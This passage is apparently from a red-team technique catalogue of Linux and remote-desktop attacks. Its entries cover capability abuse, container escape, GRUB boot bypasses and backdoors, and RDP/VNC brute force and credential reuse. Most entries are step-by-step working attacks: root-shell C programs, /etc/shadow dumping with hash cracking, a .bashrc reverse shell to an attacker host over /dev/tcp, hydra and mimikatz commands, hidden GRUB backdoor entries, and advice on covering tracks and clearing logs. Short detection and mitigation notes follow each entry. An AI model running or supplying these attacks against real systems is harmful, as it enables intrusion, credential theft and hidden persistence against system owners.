- **Attack Steps**: Step 1: Create a Privilege Escalation BinaryWrite a simple C program that sets UID to 0 and spawns a shell:c<br>#include <stdio.h><br>#include <stdlib.h><br>#include <unistd.h><br>int main() {<br> setuid(0);<br> setgid(0);<br> system("/bin/bash");<br> return 0;<br>}<br>Step 2: Compile the Programbash<br>gcc -o rootme rootme.c<br>This will create a binary rootme in your current directory.Step 3: Assign cap_setuid Capabilitybash<br>sudo setcap cap_setuid+ep ./rootme<br>This grants the binary the ability to change its user ID to root.Step 4: Validate Capabilities Assignedbash<br>getcap ./rootme<br>Expected output:./rootme = cap_setuid+epStep 5: Execute the Binarybash<br>./rootme<br>If successful, you will drop into a root shell:bash<br>whoami<br>root<br>Step 6: Check for Contextual MisuseThis attack becomes critical when:• The binary is writable by non-root users• Capabilities are applied via automation (e.g., Docker, Jenkins build)• Shared development systems where capability audits are not enforcedStep 7: Cleanup (For Lab Environments)To remove the capability:bash<br>sudo setcap -r ./rootme<br>Delete the binary:bash<br>rm rootme<br>🧠 Pro Tip:Never assign cap_setuid+ep to interpreters like Python, Perl, or Bash. These allow arbitrary code execution as root. Always use statically compiled, trusted binaries.
- **Detection**: - Use getcap -r / to scan files with dangerous capabilities- Monitor for non-root users assigning capabilities- Check for world-writable binaries with elevated caps
- **Solution**: - Remove unnecessary cap_setuid assignments- Limit setcap usage to root only- Apply file integrity monitoring (AIDE, tripwire)- Harden CI/CD policies to prevent automated capability assignment
- **Tags**: #LinuxPrivilegeEscalation #cap_setuid #CustomBinary #DevOpsMisconfig #RedTeamLinux #LocalRoot #SetcapAudit

## Read /etc/shadow via cap_dac_read_search

- **Attack Type**: Unauthorized File Read
- **Target**: Linux SystemsCI/CD EnvironmentsDeveloper Workstations
- **Vulnerability**: Misconfigured cap_dac_read_search allowing bypass of file read permissions
- **MITRE**: T1548.001 – Abuse Elevation Control Mechanism: File and Directory Permissions Modification
- **Impact**: - Leakage of /etc/shadow hashes- Offline brute-force or password cracking- Lateral movement via credential reuse
- **Tools**: ✅ Linux system (Ubuntu/Kali)✅ gcc or C compiler✅ setcap, getcap, cat✅ hashcat/john (optional for hash cracking demo)
- **Scenario**: This scenario simulates an attacker leveraging a binary with the cap_dac_read_search capability to bypass traditional UNIX file permission checks and access sensitive system files like /etc/shadow, which normally requires root access. If the binary is user-controlled or misconfigured, it can be abused to extract password hashes for offline cracking. This capability allows read access regardless of DAC (Discretionary Access Control) restrictions.
- **Attack Steps**: Step 1: Create a Simple Read BinaryWrite a minimal C program to read and print file contents:c<br>#include <stdio.h><br>#include <stdlib.h><br>int main() {<br> FILE *fp = fopen("/etc/shadow", "r");<br> if (fp == NULL) { perror("fopen"); exit(1); }<br> char c;<br> while ((c = fgetc(fp)) != EOF) putchar(c);<br> fclose(fp);<br> return 0;<br>}<br>Step 2: Compile the Programbash<br>gcc -o readshadow readshadow.c<br>Step 3: Apply Capability to BinaryAssign the cap_dac_read_search capability:bash<br>sudo setcap cap_dac_read_search+ep ./readshadow<br>Step 4: Run as Unprivileged UserSwitch to a non-root user:bash<br>su - testuser<br>./readshadow<br>You should now be able to see the contents of /etc/shadow, including all user hashes.Step 5: (Optional) Crack the HashesSave the output and use john or hashcat:bash<br>john --wordlist=/usr/share/wordlists/rockyou.txt shadowdump.txt<br>Step 6: Cleanupbash<br>sudo setcap -r ./readshadow<br>rm readshadow readshadow.c<br>🧠 Notes:• This capability is extremely dangerous if granted to user-controlled or writable binaries.• File access happens outside of UNIX permission control.• This is often found misused in DevOps, CI/CD, or container setups.• NEVER grant cap_dac_read_search to interpreters (bash, python).
- **Detection**: - Use getcap -r / to enumerate binaries with cap_dac_read_search- Monitor for unexpected read access to restricted files- Check file audit logs (auditd)
- **Solution**: - Never assign cap_dac_read_search to user-modifiable binaries- Use file integrity monitoring- Enforce strict capability audit policies- Use AppArmor/SELinux to restrict sensitive file reads
- **Tags**: #LinuxPrivilegeEscalation #cap_dac_read_search #ReadShadow #FileReadBypass #RedTeamLinux #OfflineCrack #SetcapAudit

## Full System Compromise via cap_sys_admin

- **Attack Type**: Privilege Escalation & Takeover
- **Target**: Linux HostsContainerized EnvironmentsCI/CD Runners with Elevated Binaries
- **Vulnerability**: Misconfigured or unsafe assignment of cap_sys_admin capability to untrusted binaries
- **MITRE**: T1548.001 – Abuse Elevation Control Mechanism: Capability Abuse
- **Impact**: - Mounting sensitive filesystems- Kernel namespace manipulation- File overwrite and stealth access- Container or jail breakout
- **Tools**: ✅ Linux machine (Ubuntu/Kali)✅ gcc or make✅ setcap, mount, losetup, bash, dd✅ getcap (for enumeration)
- **Scenario**: This simulation demonstrates how an attacker with access to a binary containing the cap_sys_admin Linux capability can escalate privileges to root, mount filesystems, escape containers, access arbitrary files, and manipulate kernel namespaces. This capability is referred to as "the new root" due to its wide-ranging system control powers. It is often accidentally left assigned in developer tools, monitoring agents, or container runtimes.
- **Attack Steps**: Step 1: Understand the Power of cap_sys_admincap_sys_admin grants the ability to perform mount operations, namespace control, raw I/O, and more. Binaries with this capability can escape confinement and even gain root under certain conditions.Step 2: Write an Exploit Binaryc<br>#include <stdlib.h><br>int main() {<br> system("/bin/bash");<br> return 0;<br>}<br>Step 3: Compile the Binarybash<br>gcc -o rootsh rootsh.c<br>Step 4: Assign cap_sys_adminbash<br>sudo setcap cap_sys_admin+ep ./rootsh<br>Step 5: Abuse 1 – Mount /proc from Unprivileged ContextRun:bash<br>unshare -m ./rootsh<br>mount -t proc proc /proc<br>cat /proc/1/environ<br>This allows inspection of root environment from the host, which may leak secrets or tokens.Step 6: Abuse 2 – Mount a Filesystem and Modify Itbash<br>mkdir /tmp/hackmnt<br>dd if=/dev/zero of=disk.img bs=1M count=10<br>mkfs.ext4 disk.img<br>sudo mount -o loop disk.img /tmp/hackmnt<br>echo "hacked by $(whoami)" > /tmp/hackmnt/pwned.txt<br>sudo umount /tmp/hackmnt<br>This proves the binary can mount/unmount and manipulate filesystem state like root.Step 7: Abuse 3 – Escape Container or Jail (if applicable)If running inside a container or namespace-isolated environment, the binary can use namespace tricks:bash<br>unshare -Urm /bin/bash<br>mount -t proc proc /proc<br>cat /proc/1/cmdline<br>This allows viewing of host or container-level process trees.Step 8: (Optional) Escalate to Full Root via Kernel Interface ManipulationIf the binary also has access to /proc/kcore, /dev/mem, or /sys/kernel/debug, it may be possible to directly manipulate kernel memory. This step requires deep knowledge of kernel internals.Step 9: Cleanupbash<br>sudo setcap -r ./rootsh<br>rm rootsh rootsh.c disk.img<br>🧠 Notes:• This capability is more powerful than most realize.• Widely misconfigured in CI/CD binaries and container escape demos.• Never assign it unless absolutely required, and only to trusted, signed binaries.• Do not allow this in Docker or LXC without root awareness.
- **Detection**: - Use getcap -r / to list dangerous capabilities- Audit logs for mount, unshare, losetup usage- Monitor capability assignments with OSSEC or Auditd
- **Solution**: - Never grant cap_sys_admin to user-controlled binaries- Use AppArmor/SELinux profiles to confine binaries- Enforce binary signing and integrity validation- Remove or reduce unnecessary capabilities at deploy time
- **Tags**: #Linux #PrivilegeEscalation #cap_sys_admin #ContainerEscape #MountHack #Setcap #Unshare #CIAbuse #RedTeam #NamespaceEscape

## Break Out of Containers via Capabilities

- **Attack Type**: Container Escape / Priv-Esc
- **Target**: Containers (Docker, LXC)CI/CD pipelinesDevOps Environments
- **Vulnerability**: Misconfigured Linux capabilities allowing namespace, file, or process manipulation
- **MITRE**: T1611 – Escape to Host (Container)
- **Impact**: - Host privilege escalation- Root file read/write- Remote shell on host- Full system compromise
- **Tools**: ✅ Docker or LXC environment✅ Linux host with container runtime✅ Tools: getcap, unshare, nsenter, mount, bash, gcc
- **Scenario**: This scenario simulates an attacker breaking out of a Docker or LXC container due to over-permissive Linux capabilities like cap_sys_admin, cap_sys_ptrace, or cap_dac_read_search. Containers that run with these capabilities can be escaped by attackers to gain root access on the host system. These conditions are often present in poorly configured development or CI/CD environments.
- **Attack Steps**: Step 1: Identify Capabilities from Inside ContainerRun capsh --print or check /proc/1/status inside the container to see capabilities assigned. You are particularly interested in dangerous ones like cap_sys_admin, cap_sys_ptrace, or cap_dac_override.Step 2: Confirm Kernel Isolation GapsEnsure the container shares certain kernel namespaces (host PID, user, or mount). Check with:lsns and cat /proc/1/ns/If PID or mount namespaces are not isolated, it's easier to attack the host.Step 3: Abuse cap_sys_admin to Mount Host FilesystemsTry mounting the host / into the container:bash<br>mkdir /mnt/host<br>mount -t proc proc /mnt/host/proc<br>cat /mnt/host/proc/1/cmdline # Check host process<br>Or:bash<br>mount /dev/sda1 /mnt/host # Try mounting disk<br>Success here means host access.Step 4: Use unshare to Escape into Host NamespaceIf you have cap_sys_admin, use:bash<br>unshare -Urm bash<br>mount -t proc proc /proc<br>cat /proc/1/cmdline # Inspect host init<br>This spawns a new shell with new namespaces. If user namespace is not properly restricted, you may remap to root.Step 5: Compile Helper for Further Escape (Optional)Create a C binary:c<br>#include <stdlib.h><br>int main() { system("/bin/bash"); return 0; }<br>Compile:gcc -o escape escape.cUse this to simplify mount tricks.Step 6: Read Host Files via cap_dac_read_searchIf this capability is available, read sensitive files:cat /etc/shadowcat /root/.ssh/id_rsaStep 7: Use cap_sys_ptrace to Inject Code into Host ProcessesAttach to processes on host via PID:gdb -p 1 or use ptrace wrappers.This allows memory access and possible code injection into host-level processes.Step 8: Drop a Host Root Shell (if /host writable)Write a cron job or modify .bashrc inside /mnt/host/root to execute payload:bash<br>echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' >> /mnt/host/root/.bashrc<br>Or write a reverse shell binary into /mnt/host/usr/local/bin and trigger from cron or startup scripts.Step 9: CleanupRemove traces:bash<br>rm escape<br>umount /mnt/host<br>🧠 Tip: Use AppArmor/SELinux auditing to track capability abuse attempts.
- **Detection**: - Audit container capability sets- Monitor namespace syscalls- Log host access attempts from containers
- **Solution**: - Drop all non-essential capabilities with --cap-drop=ALL- Use rootless containers- Enforce AppArmor/SELinux confinement- Avoid mounting host / or docker.sock
- **Tags**: #ContainerEscape #LinuxCapabilities #cap_sys_admin #DockerSecurity #NamespaceEscape #PrivilegeEscalation #RedTeam

## Custom Binary with Any Capability

- **Attack Type**: Privilege Escalation via LCAPs
- **Target**: Linux hostsDevelopment VMsCI/CD build agents
- **Vulnerability**: Misconfigured capability assignments on custom or dev binaries
- **MITRE**: T1548.001 – Abuse Elevation Control Mechanism (setcap)
- **Impact**: - Root shell access- Bypass of file permissions- System takeover- Lateral movement potential
- **Tools**: ✅ Linux host with setcap✅ GCC or any C compiler✅ getcap, setcap for capability assignment✅ Terminal
- **Scenario**: This scenario explores how attackers can exploit custom binaries assigned Linux capabilities (e.g., cap_sys_admin, cap_dac_override, or cap_setuid) instead of using full root privileges. These capabilities allow binaries to perform privileged operations and are often misconfigured by developers or sysadmins seeking limited privilege separation but end up unintentionally allowing full system compromise.
- **Attack Steps**: Step 1: Identify or Create a Custom BinaryAttacker starts by either locating an existing custom binary or compiling one. For example, create a binary that spawns a shell:c<br>#include <stdlib.h><br>int main() { setuid(0); system("/bin/bash"); return 0; }<br>Compile with:gcc shell.c -o shellStep 2: Assign a Dangerous CapabilityAssuming the attacker has sudo or root access, or is abusing a misconfigured setup script, assign a Linux capability to the binary:sudo setcap cap_setuid+ep ./shellThis makes it possible for the binary to change its UID to root without needing the SUID bit.Step 3: Validate Capability AssignmentRun:getcap ./shellOutput should show:./shell = cap_setuid+epStep 4: Execute the Custom BinaryRun the binary:./shellIf designed properly and the capability is not blocked by security modules, this will drop the attacker into a root shell.Step 5: Other Capability OptionsIf using cap_dac_override, the attacker could bypass file permission checks:Binary example:c<br>#include <stdio.h><br>int main() {<br> FILE *f = fopen("/etc/shadow", "r");<br> if (f) {<br> char ch;<br> while ((ch = fgetc(f)) != EOF) putchar(ch);<br> fclose(f);<br> } else {<br> perror("Error");<br> }<br> return 0;<br>}<br>Set capability:setcap cap_dac_override+ep ./readshadowRun to read /etc/shadow without root.Step 6: Use cap_sys_admin for Host TakeoverWith cap_sys_admin, attackers can mount filesystems, create new namespaces, and execute host-level enumeration:mount /dev/sda1 /mntunshare -Urm bashStep 7: Cleanup (Ethical Use Only)After testing or exploitation, remove capabilities:setcap -r ./shellDelete custom binaries:rm ./shell ./readshadow🧠 Note: Developers may assign these capabilities during testing or in CI/CD but forget to remove them before deploying to production. Always verify binary capability assignments during security audits.
- **Detection**: - Audit for capabilities via getcap -r / 2>/dev/null- Monitor custom binaries with extended attributes- Use auditd or eBPF for execution tracking
- **Solution**: - Use --cap-drop=ALL as default policy- Avoid assigning capabilities unless absolutely necessary- Restrict developer access on production systems
- **Tags**: #LinuxEscalation #CustomBinary #LCAP #setcap #PrivilegeEscalation #SecurityAudit #RedTeam

## Edit GRUB Entry to Boot into Single User Mode

- **Attack Type**: Boot-Time Local Privilege Escalation
- **Target**: Linux SystemsPhysical MachinesVMs with Console Access
- **Vulnerability**: Unprotected GRUB bootloader allows kernel parameter modification
- **MITRE**: T1548.003 – Abuse Elevation Control Mechanism: Boot or Logon Autostart Execution
- **Impact**: - Full root shell without login- Change root passwords- Persist via backdoor- Disable security services
- **Tools**: ✅ Physical or console access✅ Linux host (e.g., Ubuntu, CentOS, Debian)✅ Keyboard access at boot✅ Terminal, bash
- **Scenario**: This attack demonstrates how a local attacker with physical or console access can edit the GRUB bootloader entry during system boot to gain root shell access by booting the system into single-user or emergency mode. If GRUB is not password protected, it allows an attacker to modify kernel parameters and bypass authentication mechanisms.
- **Attack Steps**: Step 1: Reboot the SystemAttacker physically reboots or forces a restart of the target Linux machine.Step 2: Interrupt GRUB at BootAs the system starts and GRUB menu appears (usually with OS list), press Esc or hold Shift to interrupt the boot process and enter GRUB menu.Step 3: Edit Boot EntryUse arrow keys to highlight the default boot entry (usually the top one).Press e to edit the boot parameters.Step 4: Modify Kernel ArgumentsScroll to the line starting with linux or linux16, which contains the kernel path and parameters.At the end of that line, add one of the following:→ single (older systems)→ init=/bin/bash (drops straight to root shell)→ systemd.unit=rescue.target or systemd.unit=emergency.target (for systemd systems)✅ Example:Original:linux /boot/vmlinuz... quiet splashModified:linux /boot/vmlinuz... init=/bin/bashStep 5: Boot with Modified ParametersPress Ctrl + X or F10 to boot the system with the modified kernel line.Step 6: Gain Root Shell AccessThe system boots into single-user mode or emergency shell.You now have root access without login prompt.→ If root filesystem is mounted as read-only, remount it:mount -o remount,rw /→ You can now:• Change root password: passwd root• Add a user: useradd attacker && passwd attacker• Enable SSH: systemctl start sshdStep 7: (Optional) Persist AccessModify /etc/sudoers, install backdoor, add SSH key, or enable networking.Step 8: CleanupIf attack is for testing, remove changes made to accounts and logs, and reboot system.⚠️ Real-world attackers often leave backdoors here.🧠 Important: This attack bypasses all user-level and some disk encryption protections if GRUB is unprotected. On encrypted systems, this attack fails unless attacker has access to encryption password.
- **Detection**: - Check /var/log/secure and journalctl -b for unauthorized boot modifications- Detect abnormal uptime/reset patterns
- **Solution**: - Set GRUB bootloader password (grub-mkpasswd-pbkdf2)- Enable full disk encryption- Restrict physical access- Use secure boot policies
- **Tags**: #GRUBExploit #LinuxRoot #SingleUserMode #BootAttack #EmergencyModeBypass #PhysicalAccessRequired #ForensicBootAudit #RedTeam

## Bypass Forgotten Root Password

- **Attack Type**: Local Privilege Escalation via Boot
- **Target**: Linux Physical SystemsUnprotected Bootloaders
- **Vulnerability**: Insecure GRUB (no password) + unrestricted kernel parameter editing
- **MITRE**: T1548.003 – Abuse Elevation Control Mechanism: Boot-Level Bypass
- **Impact**: - Full root account access- Credential reset- Access to all files and services
- **Tools**: ✅ Physical/console access✅ Linux system (Debian, Ubuntu, RHEL, etc.)✅ Keyboard & screen access
- **Scenario**: This method is used to reset or bypass the root password on Linux systems where a user has physical or boot-level access, typically when the GRUB bootloader is unprotected by a password. This technique allows attackers or administrators to regain root control of a system without knowing the original root credentials. Commonly used in recovery or incident response situations.
- **Attack Steps**: Step 1: Reboot the SystemForce or initiate a reboot of the target machine.Step 2: Interrupt GRUB BootloaderDuring system startup, when GRUB appears, press and hold Shift or Esc (depends on distro) to bring up the GRUB menu.Step 3: Edit the Boot EntrySelect the default boot kernel (usually the top entry) and press e to edit it.Step 4: Modify Kernel ParametersLocate the line beginning with linux or linux16.At the end of this line, append one of the following:→ init=/bin/bash (bypass login, boot into root shell)→ or single (older distros, boot into single-user mode)✅ Example:linux /boot/vmlinuz... ro quiet splash → change to:linux /boot/vmlinuz... init=/bin/bashStep 5: Boot Into Modified SessionPress Ctrl+X or F10 to boot with the modified parameters.The system now boots into a minimal root shell.Step 6: Remount Root Filesystem as Read/WriteRun:mount -o remount,rw /Step 7: Reset Root PasswordSet a new root password:passwd rootEnter and confirm the new root password.Step 8: Sync and RebootFlush filesystem buffers:syncThen reboot:exec /sbin/init or simply power cycle.Step 9: Login NormallyAfter reboot, login as root using the newly set password.🛑 This process bypasses all user authentication if GRUB is not password protected or full disk encryption is absent. Should only be used for recovery or authorized audits.
- **Detection**: - Check for GRUB bootline modifications- Inspect uptime logs and password change events in auditd or journalctl
- **Solution**: - Protect GRUB with bootloader password- Enable full disk encryption- Restrict physical/console access- BIOS/UEFI password + Secure Boot
- **Tags**: #RootBypass #GRUBExploit #PasswordReset #BootAttack #LinuxRecovery #LocalPrivEsc #SingleUserMode #RedTeam #EthicalHacking

## Persistent GRUB2 Backdoor via config edit

- **Attack Type**: Boot-Level Persistence (Config Tampering)
- **Target**: Linux OS (Debian, Ubuntu, RHEL, etc.)
- **Vulnerability**: No GRUB2 passwordNo full disk encryptionWritable grub config files
- **MITRE**: T1542.003 – Boot or Logon Initialization Scripts
- **Impact**: Persistent root accessBackdoor re-entryComplete system compromise
- **Tools**: ✅ Root access or live boot✅ Bash✅ Text editor (nano/vim)✅ Backdoor binary or shell script
- **Scenario**: This attack demonstrates how an attacker with physical or root-level access can modify the GRUB2 bootloader configuration to insert a persistent root shell or backdoor binary that launches during each boot. This allows privilege escalation, backdoor re-entry, or stealth persistence on reboot. It's highly effective against systems without GRUB2 password protection or full disk encryption.
- **Attack Steps**: Step 1: Gain Root or Live Boot AccessIf you already have root, proceed. Otherwise, use a live USB/CD to boot into the system and mount the target Linux partition.Step 2: Locate GRUB ConfigurationFind the GRUB config stub:/etc/default/grubAlso note final compiled config:/boot/grub/grub.cfg (do not edit this directly).Step 3: Modify GRUB Default EntryEdit /etc/default/grub:Add or change:GRUB_CMDLINE_LINUX_DEFAULT="quiet splash init=/bin/bash"This ensures GRUB will pass the init=/bin/bash kernel parameter and spawn a root shell at boot.Step 4: (Optional) Add Auto-Execution of BackdoorCreate or copy a backdoor shell script or binary:/root/.backdoor.sh (example payload: reverse shell, keylogger, etc.)Make it executable:chmod +x /root/.backdoor.shNow edit /etc/default/grub to execute it:GRUB_CMDLINE_LINUX_DEFAULT="quiet splash init=/root/.backdoor.sh"Step 5: Regenerate GRUB ConfigRun:update-grub (Debian/Ubuntu)or:grub2-mkconfig -o /boot/grub2/grub.cfg (RHEL/CentOS)This rewrites the actual GRUB config used at boot.Step 6: Test Backdoor on RebootReboot the system. Instead of the normal login screen, the system will drop to a root shell or execute the backdoor script silently depending on the payload used.Step 7: Make Persistence Stealthier (Optional)To reduce visibility:• Hide .sh or rename to something like udevinit.sh• Change GRUB timeout to 0 to avoid menu• Suppress splash screen and boot messagesStep 8: Cover Tracks (Advanced)• Wipe .bash_history• Touch backdoor files with old timestamps• Remove or tamper with update-grub logs or /boot timestamps✅ Result: Persistent root-level backdoor that survives reboots and evades most basic detection tools.
- **Detection**: Inspect /etc/default/grub and /boot/grub/grub.cfg for unusual init= or unknown pathsAudit last modified times of boot files
- **Solution**: • Set GRUB2 password with grub-mkpasswd-pbkdf2• Restrict physical access• Use full disk encryption• Monitor for tampered GRUB entries and init= parameters
- **Tags**: #GRUB2Backdoor #PersistentRoot #BootTampering #LinuxExploit #GRUBAbuse #RedTeamPersistence #SecureBoot

## Add Custom GRUB Menu Entry for Root Access

- **Attack Type**: Bootloader Configuration Exploit
- **Target**: Linux OS (Ubuntu, Debian, RHEL, etc.)
- **Vulnerability**: No GRUB2 password protectionConfigurable GRUB menu entriesNo disk encryption
- **MITRE**: T1542.003 – Boot or Logon Initialization Scripts
- **Impact**: Root access at bootAuthentication bypassStealth backdoor persistence
- **Tools**: ✅ Root or Live USB access✅ Text editor (nano/vim)✅ Bash shell or terminal✅ Basic Linux commands
- **Scenario**: This technique shows how an attacker with physical or root access can create a custom GRUB2 menu entry that boots the system directly into a root shell, bypassing standard user authentication. It leverages the ability to inject new boot options into GRUB's config file, commonly found on unprotected systems with no GRUB password or full disk encryption. This can be used for privilege escalation or persistent boot-level access.
- **Attack Steps**: Step 1: Boot into System with AccessIf root access is available: login normally.If physical access only: boot into a live Linux environment using a USB.Step 2: Mount the Target Root Partition (if using live USB)bash<br>mkdir /mnt/target<br>mount /dev/sdX# /mnt/target<br>Also bind system folders:bash<br>mount --bind /dev /mnt/target/dev<br>mount --bind /proc /mnt/target/proc<br>mount --bind /sys /mnt/target/sys<br>chroot /mnt/target<br>Step 3: Locate GRUB Directorybash<br>cd /etc/grub.d/<br>Step 4: Create a Custom GRUB Menu EntryCreate a new file:bash<br>nano 40_custom<br>Insert the following content:bash<br>menuentry 'Root Shell Access' {<br> set root=(hd0,1)<br> linux /vmlinuz root=/dev/sdX# rw init=/bin/bash<br> initrd /initrd.img<br>}<br>Replace (hd0,1) and /dev/sdX# with the actual device values.Step 5: Regenerate GRUB Configurationbash<br>update-grub<br>This updates /boot/grub/grub.cfg to include the new menu entry.Step 6: Reboot and Select New EntryRestart the system and at the GRUB menu select “Root Shell Access”.System will boot directly into a root shell without authentication.Step 7: Optional - Make Entry Stealthy• Rename menu entry to a misleading name (e.g., “Recovery Mode” or “Memory Test”)• Set GRUB timeout to 0 in /etc/default/grub to hide the menu:GRUB_TIMEOUT=0Result: Backdoor access as root on every boot, unless removed.
- **Detection**: Inspect /etc/grub.d/40_custom or /boot/grub/grub.cfg for unauthorized entriesCompare GRUB config hashesMonitor boot parameters
- **Solution**: - Enable GRUB2 password- Use full disk encryption- Limit physical access- Monitor boot config integrity- Restrict write access to /etc/grub.d/
- **Tags**: #GRUBExploit #RootBypass #BootPersistence #LinuxPrivilegeEscalation #RedTeamTTPs #CustomBootEntry

## Brute Force RDP / VNC Login

- **Attack Type**: Authentication Attack (Brute Force)
- **Target**: Windows / Linux desktops and servers
- **Vulnerability**: Weak or default credentialsNo account lockoutPublicly exposed RDP or VNC services
- **MITRE**: T1110.001 – Brute Force: Password Guessing
- **Impact**: Unauthorized system accessDesktop controlPossible lateral movement
- **Tools**: ✅ Hydra✅ Ncrack✅ Medusa✅ xfreerdp or rdesktop (RDP clients)✅ vncviewer or RealVNC (VNC clients)✅ rockyou.txt / custom wordlist
- **Scenario**: This scenario simulates an attacker attempting to gain unauthorized access to a system through Remote Desktop Protocol (RDP) or Virtual Network Computing (VNC) by brute-forcing user credentials. Common in misconfigured environments where RDP or VNC is exposed to the internet, this technique involves automated attempts using wordlists until a valid username/password pair is found. Weak credentials or lack of lockout policies make this attack feasible.
- **Attack Steps**: Step 1: Discover Open RDP/VNC PortsUse Nmap to scan target for open ports:bash<br>nmap -p 3389,5900-5905 <target-ip> -sV<br>3389 → RDP, 5900–5905 → VNCStep 2: Validate the ServiceFor RDP, confirm connectivity:bash<br>xfreerdp /u:user /p:pass /v:<target-ip><br>For VNC:bash<br>vncviewer <target-ip>:5900<br>Step 3: Prepare WordlistsCommon paths:• /usr/share/wordlists/rockyou.txt• Create custom username/password combos (e.g., admin/admin123)Step 4: Run Hydra Against RDPbash<br>hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target-ip><br>Successful login will be shown in output.Alternative Tool (Ncrack for RDP)bash<br>ncrack -vv --user administrator -P passwords.txt rdp://<target-ip><br>Step 5: Brute Force VNC Password (No Username)bash<br>hydra -P /usr/share/wordlists/rockyou.txt -t 4 <target-ip> vnc<br>Or:bash<br>ncrack -vv -P vncpass.txt vnc://<target-ip>:5900<br>Step 6: Login After SuccessAfter finding valid credentials, log in:bash<br>xfreerdp /u:<user> /p:<pass> /v:<target-ip><br>orbash<br>vncviewer <target-ip>:5900<br>Access to remote desktop or GUI shell is now achieved.Note: On some systems, successful brute-force RDP login may spawn a desktop session with full user privileges.
- **Detection**: - Monitor failed login attempts on RDP/VNC logs- Use endpoint detection (EDR)- Analyze account login patterns
- **Solution**: - Enforce strong password policies- Enable account lockout- Restrict RDP/VNC via VPN or firewall- Enable MFA- Disable unused remote services
- **Tags**: #BruteForce #RDPExploit #VNCAttack #AuthenticationBypass #PasswordGuessing #RemoteAccess #RedTeam

## Anonymous or No-Auth VNC Access

- **Attack Type**: Authentication Misconfiguration Exploit
- **Target**: Linux / Windows workstationsIoT or embedded devicesLegacy servers with GUI
- **Vulnerability**: VNC server configured with no authentication or blank password
- **MITRE**: T1021.001 – Remote Services: VNC
- **Impact**: Full GUI desktop access without credentialsPotential for privilege escalation, lateral movement
- **Tools**: ✅ vncviewer✅ nmap✅ netcat✅ RealVNC Viewer✅ TightVNC✅ Shodan.io (for discovery)
- **Scenario**: Some VNC servers (like TightVNC, RealVNC, TigerVNC) may be configured to allow unauthenticated access—either intentionally for convenience or due to misconfiguration. If authentication is disabled, any remote attacker can connect directly and gain control over the GUI desktop. This is particularly dangerous when the VNC server runs as root or is exposed to the internet. Such vulnerabilities are common in legacy systems, testing environments, or poorly configured IT infrastructure.
- **Attack Steps**: Step 1: Scan for Open VNC PortsUse Nmap to identify VNC ports (typically 5900–5905):bash<br>nmap -p 5900-5905 <target-ip> -sV<br>This reveals services like VNC protocol: vnc protocol v3.8 or similar.Step 2: Manual Connection Attempt Without PasswordUse any VNC viewer (e.g., vncviewer) to attempt access:bash<br>vncviewer <target-ip>:5900<br>If the connection is accepted without prompting for a password, the server is configured with No Authentication or Blank Password.Step 3: Alternative Tools for Discovery (Optional)Use Shodan or Censys with the following query:port:5900 authentication disabledThis can show publicly exposed systems with no authentication.Step 4: Interact with Remote GUIOnce connected, the attacker can:• View the desktop in real-time• Move the mouse and interact with applications• Execute programs• Open terminals or browsers• Steal clipboard data or screenshots• Install backdoorsStep 5: Confirm Privilege Context (if root)If the VNC server is running as root (common in embedded devices or test machines), the attacker gains full root-level GUI access.Step 6: Optional – Dump Screen for EvidenceRun:bash<br>ffmpeg -video_size 1024x768 -framerate 1 -f x11grab -i :0.0 output.mp4<br>Or use screen recording in GUI⚠️ Note: Many VNC clients will silently connect if no authentication is required. You should always ensure the behavior is logged or explicitly monitored.
- **Detection**: - Monitor for unusual connections on TCP 5900–5905- Check system logs (e.g., /var/log/auth.log)- Use network IDS/IPS for VNC connections
- **Solution**: - Always enable strong authentication on VNC services- Use VPN or SSH tunnels for access- Disable unused remote access tools- Restrict ports using firewalls
- **Tags**: #VNCExploit #RemoteDesktop #UnauthAccess #GUIAttack #OSExploits #AuthenticationBypass

## Credential Reuse via RDP

- **Attack Type**: Lateral Movement via Valid Credentials
- **Target**: Windows ServersEnterprise DesktopsRemote Access Systems
- **Vulnerability**: Password reuse across multiple machines with RDP enabled
- **MITRE**: T1075 (Valid Accounts)T1021.001 (Remote Services: RDP)
- **Impact**: Lateral movementUnauthorized system accessPrivilege escalation via valid accounts
- **Tools**: ✅ Mimikatz✅ xfreerdp / rdesktop✅ crackmapexec✅ Metasploit✅ Windows Remote Desktop (mstsc)
- **Scenario**: In enterprise networks, users often reuse the same password across multiple systems. If an attacker compromises one host and extracts valid RDP credentials (e.g., via LSASS dump, keylogger, or phishing), those credentials can be reused to connect to other machines over Remote Desktop Protocol (RDP). This allows lateral movement, data exfiltration, or privilege escalation, especially when accounts are members of local admins or domain admins.
- **Attack Steps**: Step 1: Obtain Valid Credentials from a Compromised HostFrom an already compromised machine (via phishing, malware, or physical access), extract credentials using tools like:bash<br>mimikatz<br>sekurlsa::logonpasswords<br>This reveals plaintext or hashed credentials of currently logged-in users.Step 2: Identify RDP-Enabled Hosts on NetworkUse tools like Nmap or CrackMapExec to discover hosts with open RDP:bash<br>nmap -p 3389 -sV <target-network-range><br>Or:bash<br>crackmapexec smb <subnet> -u <user> -p <pass> --shares<br>This lists reachable systems and validates the credentials.Step 3: Attempt RDP Connection with Reused CredentialsIf the credentials are valid, initiate an RDP session:bash<br>xfreerdp /u:<username> /p:<password> /v:<target-ip><br>Or from Windows:Run → mstsc → enter IP and credentialsIf login is successful, attacker gets GUI access to the new host.Step 4: Optional – Escalate Privileges or Exfiltrate DataOnce on the target system:• Check if user is local admin• Install persistence mechanisms (e.g., registry run keys)• Access sensitive files, shared foldersStep 5: Maintain OPSEC and Persistence• Clear event logs if needed• Avoid noisy login patterns• Consider creating shadow accounts if stealth required⚠️ Tip: CrackMapExec can automate credential spraying to multiple systems:bash<br>crackmapexec rdp <ip-range> -u <user> -p <pass><br>If accounts are reused across machines, access spreads rapidly.
- **Detection**: - Monitor for RDP logins across multiple systems- Check for unusual login patterns- Enable RDP event auditing (event ID 4624, 4625, 4776)
- **Solution**: - Enforce unique passwords across systems- Disable unnecessary RDP access- Implement MFA for remote access- Use account lockout policies
- **Tags**: #CredentialReuse #RDPAttack #WindowsLateralMovement #ValidAccounts #RDPExploit

- **Vulnerability**: Insecure clipboard sharingSession token exposureCredential reuse in memory
- **MITRE**: T1056.001 (Input Capture – Keylogging)T1021.001 (RDP Hijack)T1075 (Valid Accounts)
- **Impact**: Unauthorized session accessCredential leakageRemote command execution
- **Tools**: ✅ Mimikatz✅ Wireshark✅ RDP Clip Monitor✅ RDPY (RDP proxy)✅ Metasploit (Session Sniffing Module)
